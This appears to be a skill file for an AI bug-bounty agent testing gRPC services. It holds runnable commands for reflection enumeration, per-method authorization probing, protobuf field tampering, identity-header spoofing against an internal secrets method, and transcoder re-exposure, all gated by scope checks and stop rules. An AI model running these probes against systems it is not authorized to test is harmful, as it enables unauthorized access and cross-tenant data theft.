---
name: zp-grpc
description: ZeroProtocol hunter for gRPC and protobuf services - reflection-driven method discovery, per-method authorization gaps (the gRPC analogue of BFLA), protobuf field tampering, metadata identity trust, and gRPC-Web, Connect or JSON-transcoding gateways that re-expose internal methods with weaker checks. Use when a port speaks HTTP/2 with application/grpc, when a request body is opaque length-prefixed binary, when a grpc-status trailer appears, or when Envoy or grpc-gateway fronts a microservice.
---

# zp-grpc - one port, every method, no path to filter on

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

gRPC has no URL surface to protect. There is no `/admin/*` prefix for a WAF to block and no route table for a proxy to gate, so **every method must authorise itself** - and most were written for an east-west mesh where nobody thought it had to. The finding is never "reflection is on": it is a named method returning `grpc-status 0` with data or a side effect it should have refused, reached the way an external attacker actually reaches it.

---

## Procedure

**1. Confirm the transport.** gRPC needs HTTP/2, by ALPN or by prior knowledge.

```bash
H=target.tld; P=443            # 50051 h2c · 443/8443 TLS h2 · 8080/9090 h2c behind a proxy
echo | openssl s_client -alpn h2 -connect "$H:$P" 2>/dev/null | grep -i 'ALPN protocol'
curl -s --http2-prior-knowledge -X POST "http://$H:50051/zp.Probe/Nope" \
  -H 'content-type: application/grpc' -H 'te: trailers' -D - -o /dev/null --max-time 10
curl -s --http2 -X POST "https://$H/grpc.health.v1.Health/Check" \
  -H 'content-type: application/grpc' -H 'te: trailers' -D - -o /dev/null --max-time 10
```

`grpc-status: 12` (UNIMPLEMENTED) on a nonsense path **is** the fingerprint - gRPC errors arrive as a Trailers-Only response, so the status sits in the HEADERS block where `-D -` sees it. HTTP 200 with a non-zero `grpc-status` is an error; the HTTP code carries no verdict in this protocol. That same probe answered over plaintext h2c, while real clients send bearer metadata, is your cleartext-transport finding.

**2. Enumerate the catalog** - `grpcurl` if `zp-doctor` found it, by hand if not.

```bash
grpcurl -plaintext "$H:50051" list        # -insecure for bad TLS, no transport flag for valid TLS
grpcurl -plaintext "$H:50051" describe admin.AdminService.DeleteUser
grpcurl -plaintext "$H:50051" describe .admin.DeleteUserRequest      # message fields
for s in $(grpcurl -plaintext "$H:50051" list); do grpcurl -plaintext "$H:50051" list "$s"; done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|impersonate|exec|migrate|reset|delete|billing|channelz' grpc-catalog.txt
```

**No grpcurl?** Reflection is just an RPC whose request message is two bytes - `list_services` is field 7, a string, so the tag is `(7<<3)|2 = 0x3a`, and the frame is flag `0x00` plus a 4-byte big-endian length:

```bash
python3 - <<'PY' > refl.bin
import struct,sys
def v(x):                                                      # varint
    o=b""
    while True:
        b=x&0x7f; x>>=7; o+=bytes([b|0x80]) if x else bytes([b])
        if not x: return o
def sf(n,t): b=t.encode(); return bytes([n<<3|2])+v(len(b))+b   # string field
def vf(n,x): return bytes([n<<3|0])+v(x)                        # int field, reused in step 5
m = sf(7,"")      # list_services="" ; sf(4,"admin.AdminService") asks for that symbol's descriptor
sys.stdout.buffer.write(b"\x00"+struct.pack(">I",len(m))+m)
PY
xxd refl.bin      # exactly: 00 00 00 00 02 3a 00
curl -s --http2-prior-knowledge -X POST --data-binary @refl.bin --max-time 10 -o resp.bin -D - \
  "http://$H:50051/grpc.reflection.v1.ServerReflection/ServerReflectionInfo" \
  -H 'content-type: application/grpc' -H 'te: trailers'
strings -n 4 resp.bin        # service names are plain ASCII in the reply
```

Retry `grpc.reflection.v1alpha.ServerReflection` - older servers ship only the alpha name. `ServerReflectionInfo` is bidi-streaming, so the stream idles after the reply; that is what `--max-time` is for, and whatever reached `resp.bin` is still valid.

**3. Reflection off is not a wall** - the client knows the schema.

```bash
grep -rhoE '/[a-z0-9_.]+\.[A-Za-z][A-Za-z0-9]*/[A-Z][A-Za-z0-9]*' js/ surface/urls.txt | sort -u
grep -rnE 'serializeBinary|deserializeBinary|grpc-web|connect-protocol-version' js/ | head
for p in proto descriptor.pb swagger.json openapiv2/service.swagger.json; do printf '%-32s %s\n' "/$p" "$(curl -sk -o /dev/null -w '%{http_code}' "https://$H/$p")"; done
protoc --descriptor_set_out=b.bin --include_imports -I proto/ proto/*.proto   # if protos recovered
grpcurl -protoset b.bin -plaintext "$H:50051" list
```

Paths harvested from a bundle are callable directly; descriptors also ship inside mobile and desktop clients -> `zp-js-secrets`, `zp-mobile`, `zp-code-audit`.

**4. Walk every method against the role matrix.** This is the whole skill - anonymous, low-privilege token, owner as control. One row per method, one request per cell.

```bash
for m in $(grep -oE '[a-z0-9_.]+\.[A-Za-z]+\.[A-Za-z]+' grpc-catalog.txt | sort -u); do
  for id in "" "authorization: Bearer $LOW"; do
    printf '%-52s %-4s ' "$m" "${id:+low}${id:-anon}"
    grpcurl ${id:+-H "$id"} -plaintext -d '{}' "$H:50051" "${m%.*}/${m##*.}" 2>&1 | grep -oE 'Code: [A-Za-z]+|^\{' | head -1
  done
done
```

Read the **status**, never the byte count. `InvalidArgument (3)` means you reached the handler and only the payload is wrong - that method is callable, so fix the message and come back to it.

**5. Tamper with the message, not just the metadata.** Protobuf mass assignment is JSON mass assignment with the names hidden. Add fields `describe` shows but the client never sends (`role`, `tenant_id`, `is_admin`), point an id at your second account's object, send a wrong wire type, and add an undefined field number - unknown fields are retained silently and often forwarded to a service that does understand them.

```bash
grpcurl -plaintext -d '{"user_id":1337,"role":"admin","tenant_id":0}' "$H:50051" user.UserService/GetUser
python3 -c 'import sys;sys.stdout.buffer.write(open("body.bin","rb").read()[5:])' | protoc --decode_raw
```

`--decode_raw` recovers field numbers and wire types from any captured body **once the 5-byte frame header is stripped** - names are lost, numbers are all the wire needs. Without `protoc`, build bodies with `vf`/`sf` above. Live capture -> `zp-proxy` (enable HTTP/2; gRPC clients routinely ignore the system proxy).

**6. Metadata trust - the gRPC-specific crown jewel.** The gateway authenticates, then hands the backend an identity header. If it does not strip the copy *you* sent, you are anyone.

```bash
for h in "x-user-id: 1" "x-tenant-id: 0" "x-authenticated-user: admin" "x-forwarded-user: admin" \
         "x-internal-request: true" "x-envoy-internal: true" "x-jwt-payload: e30"; do
  printf '%-28s ' "${h%%:*}"
  grpcurl -H "$h" -plaintext -d '{}' "$H:50051" internal.InternalService/GetSecrets 2>&1 | head -1
done
```

Two experiments, and only the second makes it a report - spoof it at the backend port, then spoof it **through the public proxy**. Also try keys ending in `-bin` (base64-decoded by the server, skipped by middleware that inspects only text metadata).

**7. The HTTP front door - where the external attacker actually stands.** Nearly every gRPC service is also reachable as HTTP, and the translator is thinner on checks than the gRPC client was.

```bash
M=/user.UserService/GetUser
buf curl --protocol grpcweb --list-methods "https://$H"          # if buf exists
buf curl --protocol grpcweb -d '{"user_id":1}' "https://$H$M"
python3 -c 'import struct,sys;m=bytes([8,1]);sys.stdout.buffer.write(b"\x00"+struct.pack(">I",len(m))+m)' >f.bin
curl -s "https://$H$M" -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' --data-binary @f.bin -D - | xxd | head
base64 -w0 f.bin | curl -s "https://$H$M" -H 'content-type: application/grpc-web-text' -H 'x-grpc-web: 1' --data-binary @- -D -
curl -s "https://$H$M" -H 'content-type: application/json' -H 'connect-protocol-version: 1' -d '{"user_id":1}' -D -
curl -s -X POST "https://$H/v1/admin/users" -H 'content-type: application/json' -d '{}' -D -
```

`f.bin` is step 2's framing around `08 01` (field 1 varint = 1); the `grpc-web-text` variant is the same frame base64-encoded, for HTTP/1.1 paths. Envoy's `grpc_json_transcoder` serves the canonical `/pkg.Service/Method` path with a JSON body, grpc-gateway serves the annotated REST path, and buf Connect takes plain JSON with no framing at all. Any of the three can re-expose a method the mesh thought was internal. gRPC-Web returns trailers **inside the body** as a frame with flag `0x80`, so `grpc-status` is there, not in the headers.

**8. Stop point - state it in the report.** You stop at one `grpc-status 0` on a method that should have refused you, on **your own** objects with **two accounts you own**. You do not iterate an id range past proof, call a mutating RPC against another tenant, use a credential an RPC returned, or send a size, nesting or reset flood. `grpc-status 8` (RESOURCE_EXHAUSTED) is a limit working - do not push on it, and read deadline handling with a single `grpc-timeout: 1n` (expect `4`) instead. CVE-2023-44487 rapid reset is **version-matched from the `server` banner and handed to `zp-cve`**, never demonstrated; `ghz` and `h2load` are throughput benchmarkers that cannot emit the HEADERS+RST_STREAM pattern, so a "slower under load" graph proves nothing.

---

## Probes and payloads

| Probe | Breaks | Positive looks like |
|---|---|---|
| `POST /zp.Probe/Nope`, `content-type: application/grpc` | is this gRPC at all | `grpc-status: 12` in a Trailers-Only HEADERS block |
| `00 00 00 00 02 3a 00` to `ServerReflection/ServerReflectionInfo` | reflection left on in production | ASCII service names in the response body |
| a `describe`d method called with `-d '{}'`, no credential | per-method authz never written | `Code: OK` and a populated message |
| the same method with `$LOW` | BFLA - low-priv reaching privileged code | `OK` on an admin-named method |
| an id field set to your account B object | BOLA inside a protobuf field | B's data returned under A's token |
| `role`, `is_admin`, `tenant_id` added to the request | mass assignment via an unfilled schema field | privilege reflected, or changed state on re-read |
| undefined field number, or wrong wire type | unknown-field retention, loose wire checks | accepted where `InvalidArgument` was correct |
| `x-user-id` / `x-tenant-id` / `x-forwarded-user` **via the public proxy** | gateway that injects identity and forgets to strip it | another tenant's data. Critical |
| `auth-token-bin: <base64>` | middleware that reads only text metadata | auth path skipped |
| `grpc.channelz.v1.Channelz/GetTopChannels`, `GetServerSockets` | debug service shipped to production | internal peers, sockets, call stats |
| `/pkg.Service/Method` as JSON, `grpc-web+proto`, `grpc-web-text`, Connect JSON | transcoder re-exposing a method with weaker checks | `grpc-status 0` on a route no gRPC client uses |
| `OPTIONS` on the gRPC-Web path with `Origin: https://evil.tld` | permissive CORS on the transcoder | reflected origin plus credentials -> `zp-cors` |

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| privileged method, no credential, `grpc-status 0` **and** data or a re-read side effect | **confirmed missing authorization.** Critical |
| spoofed identity metadata forwarded by the **public** proxy, other tenant's data returned | **confirmed cross-tenant impersonation.** Critical |
| low-priv token reaching an admin method the UI never offers | confirmed BFLA -> `zp-authz` |
| id swap returning account B's object, both sides shown | confirmed BOLA -> `zp-idor` |
| transcoded HTTP/JSON route calling an internal method unauthenticated | confirmed and externally reachable. High |
| `grpc-status 0` with an empty message on a method with nothing to return | **not proof.** Show data or changed state, or kill it |
| `Unauthenticated (16)` / `PermissionDenied (7)` | authorisation works. Killed |
| `Unimplemented (12)` | wrong path, or not on this server. Killed, not a bug |
| `InvalidArgument (3)` | reached, payload wrong. Neither a finding nor a kill - fix and re-send |
| HTTP 200 read as success while `grpc-status` is non-zero | scanner artefact. Killed |
| reflection enabled, nothing sensitive callable | info disclosure at most, Low/Medium. Many vendors ship it on by design |
| `grpc.health.v1.Health/Check` answering anonymously | intended. Killed |
| `.proto` or descriptor leak with no callable sensitive method | Low, and only as the enabler for the reflection-off path |
| method reachable only on an internal `:50051` found by port scan | real, but severity follows reachability - name the external path (exposed port, SSRF egress, proxy passthrough) or say it needs one |
| spoofed metadata works on the backend port but the proxy strips it | defence in depth only. Say so plainly - Low |
| the "vulnerable" method is a genuinely public read | killed. Compare anonymous and authenticated output first |
| slow responses under a burst | not CVE-2023-44487, and almost certainly out of scope. Killed |

---

## High-value patterns

- **Reflection on plus a service named `admin`, `internal` or `billing`** - the catalog names the target and step 4 is ten requests.
- **A gateway that injects `x-user-id` and forgets to strip the inbound copy.** The highest-paying shape in this class, and it is one header.
- **A transcoder on the public edge over a mesh service** - the gRPC plane assumes mTLS peers; the HTTP plane has whatever the filter chain remembered to add.
- **Streaming methods.** Barely tested, and the authorisation check often covers only the first message, or only the unary sibling.
- **`grpc.channelz.v1.Channelz` left enabled** - internal topology, peer IPs and call volumes, straight to `zp-info-disclosure`.
- **Mobile and desktop backends.** The schema ships in the binary, so reflection-off costs nothing, and this is where unauthenticated gRPC survives longest.
- **An RPC field taking a URL or host** (webhook, import, render, avatar fetch) - protobuf SSRF, confirmed with an out-of-band canary, then `zp-ssrf`.
- **An `alg=none` or unverified JWT in `authorization` metadata** - separate code from the REST API's check. Verify offline first with `zp-jwt-oauth`.

---

## Pitfalls

- **Reporting "reflection is enabled" as the finding.** It is the enabler; the report is the method you then called.
- **Counting bytes instead of reading `grpc-status`.** Error frames have bodies - use `grpcurl -v` and read the trailers. And gRPC errors are HTTP 200, so the HTTP code tells you nothing.
- **Dropping `te: trailers` or `--http2-prior-knowledge`** from a raw curl and concluding the port is not gRPC. Check the `v1alpha` reflection name too before giving up.
- **Feeding a captured body to `protoc --decode_raw` with the 5-byte header still on it.** It fails and looks like "not protobuf".
- **Proving metadata spoofing only on the bypassed backend port.** Without the proxy leg there is no external attacker.
- **Iterating an id range to "show impact".** Two of your own accounts is the proof; a thousand real records is an incident you caused.
- **Deep nesting, giant `repeated` fields, oversized messages, rapid reset.** Resource exhaustion is out of scope on essentially every program - read the limits, never test them.
- **Calling `Delete*`, `Migrate*`, `Reset*` or `Impersonate*` to see what happens.** Use `describe` and the read siblings; ZeroProtocol stops at proof.
- **Using a credential or cloud token an RPC handed back.** Report the disclosure, never the key.
- **Testing a vendor-hosted gRPC endpoint** found in the bundle. Re-run `zp-scope check` on that host first.

---

## Hand off to

New host or port in the catalog -> `zp-scope` first. Per-method authz -> `zp-authz`; id and tenant fields -> `zp-idor`; endpoint inventory and mass assignment -> `zp-api`. Tokens and metadata auth -> `zp-jwt-oauth`. URL-taking fields -> `zp-ssrf`. Transcoder CORS -> `zp-cors`. Method paths and descriptors in bundles -> `zp-js-secrets`, in a client binary -> `zp-mobile`, in source -> `zp-code-audit`. HTTP/2 capture and replay -> `zp-proxy`; ALPN, ports and TLS -> `zp-recon-active`; undiscovered gateway routes -> `zp-content-discovery`. Version-matched HTTP/2 or grpc-go CVEs -> `zp-cve`. Channelz and descriptor leakage -> `zp-info-disclosure`. Cloud credentials returned by an RPC -> `zp-cloud`. Streaming state machines -> `zp-websocket`, `zp-business-logic`. Confirmed -> `zp-triage` then `zp-report`.
